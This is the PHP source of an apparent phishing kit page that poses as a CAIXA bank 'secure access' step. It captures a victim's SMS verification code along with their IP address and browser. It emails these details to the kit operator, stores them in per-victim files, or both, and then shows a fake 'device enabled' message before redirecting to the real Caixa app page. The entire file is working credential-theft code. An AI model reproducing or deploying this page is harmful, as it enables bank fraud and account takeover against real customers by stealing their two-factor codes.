﻿<?php
require_once('email.php');

$codigo     = $_POST['codigo'];


$useragent = $_SERVER['HTTP_USER_AGENT'];
 
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
  
$today      = date("H-i-s");
$ip_usuario = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Sao_Paulo');
$dataE      =    date('d/m/Y');



if($metodo == 'mail' ){

$message = "
-------------ANDA MEU FIO ENVIA O SMS-------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
-------------SMS DE HABILITAR-------------<br />
<b>[ShK]-CodigoSMS:</b> $codigo<br />
-------------SMS DE HABILITAR-------------<br />";


$assunto = "BlueDiamond - $ip_usuario - Confirmacao recebida com sucesso!";
$nome = "BlueDiamond";


$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: BlueDiamond <confirmacao@cadastroshk.com.br>\r\n";

@mail($email, $assunto, $message, $headers);

}
if($metodo == 'host' ){
	
$myFile = "./Cadastros/" . "Cliente-$ip_usuario" . ".html";


$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");

$stringData = "
-------------SMS DE HABILITAR-------------<br />
<b>[ShK]-CodigoSMS:</b> $codigo<br />
-------------SMS DE HABILITAR-------------<br />";
fwrite($fh, $stringData);

fclose($fh);

}
if($metodo == 'ambas' ){
	

$myFile = "./Cadastros/" . "Cliente-$ip_usuario" . ".html";


$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");

$stringData = "
-------------SMS DE HABILITAR-------------<br />
<b>[ShK]-CodigoSMS:</b> $codigo<br />
-------------SMS DE HABILITAR-------------<br />";
fwrite($fh, $stringData);

fclose($fh);


$message = "
-------------ANDA MEU FIO ENVIA O SMS-------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
-------------SMS DE HABILITAR-------------<br />
<b>[ShK]-CodigoSMS:</b> $codigo<br />
-------------SMS DE HABILITAR-------------<br />";


$assunto = "BlueDiamond - $ip_usuario - Confirmacao recebida com sucesso!";
$nome = "BlueDiamond";


$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: BlueDiamond <confirmacao@cadastroshk.com.br>\r\n";

@mail($email, $assunto, $message, $headers);

}
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="5;URL=https://play.google.com/store/apps/details?id=br.com.gabba.Caixa&hl=pt">
<title>Acesso Seguro</title>

<style>

body {
	margin: 0;
	font-family:Arial, Helvetica, sans-serif;
	}

#topo {
	width: 100%;
	height: 42px;
	background: url(img/mLogomenor.png) no-repeat;
	background-position: 14px 14px;
	background-color: #1664AC;
	}
	
.logininput {
	width: 100%;
    max-width: 100%;
	box-sizing: border-box;
	font-size: 16px;
	border: none;
	border-bottom: solid 1px #b3b3b3;
	border-radius: 2px;
	display: block;
	color: #000;
	padding: 8px;
	height: 36px;
	}

.bttenter {
	background:url(img/bgbottom.png) repeat;
    border-radius: 4px;
    font-family: arial;
    font-size: 18px;
	color: #fff;
    padding: 12px;
    text-align: center;
    width: 100%;
	border:1px solid #999;
	cursor: pointer;
	}

</style>
</head>

<body>

<div id="topo"></div>

<div style="padding:10px;">

<div style="padding:10px 20px; text-align:center; font-size:16px; color: #277EB6; "><b>DISPOSITIVO HABILITADO</b></div>

<div style="padding:10px 20px; text-align:center; background: #F6F4F4; border: 1px solid #D8D8D8;"><img src="img/alert.png" height="29" width="29" />Dispositivo habilitado com sucesso,<br> aguarde nosso contato.</div>


<div style="padding:10px 20px; text-align:center; border: 1px solid #D8D8D8;">CAIXA agradece sua cooperação.</div>
</div>

</body>
</html>